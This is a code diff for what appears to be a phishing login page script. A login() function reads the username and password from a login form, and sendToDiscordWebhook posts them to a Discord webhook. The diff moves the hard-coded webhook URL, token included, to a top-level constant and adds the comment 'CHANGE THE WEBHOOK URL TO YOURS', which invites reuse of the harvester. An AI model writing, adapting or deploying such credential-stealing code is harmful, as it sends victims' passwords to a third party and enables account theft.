@@ -1,3 +1,7 @@
+// CHANGE THE WEBHOOK URL TO YOURS
+
+const webhookUrl = 'https://discordapp.com/api/webhooks/1241371321175375903/iF1wqdCpkHvh908vq-WVU0kRtCLnaR_LaSbfGxIRWpgjTOdE4gt7yAT6IZMZDhWFbCPa';
+
 function login() {
   const username = document.querySelector('.login-box input[type="text"]').value;
   const password = document.querySelector('.login-box input[type="password"]').value;
@@ -23,7 +27,6 @@ function login() {
 }
 
 function sendToDiscordWebhook(username, password) {
-  const webhookUrl = 'https://discordapp.com/api/webhooks/1241371321175375903/iF1wqdCpkHvh908vq-WVU0kRtCLnaR_LaSbfGxIRWpgjTOdE4gt7yAT6IZMZDhWFbCPa';
 
   // Prepare the data to send to the Discord webhook
   const data = {
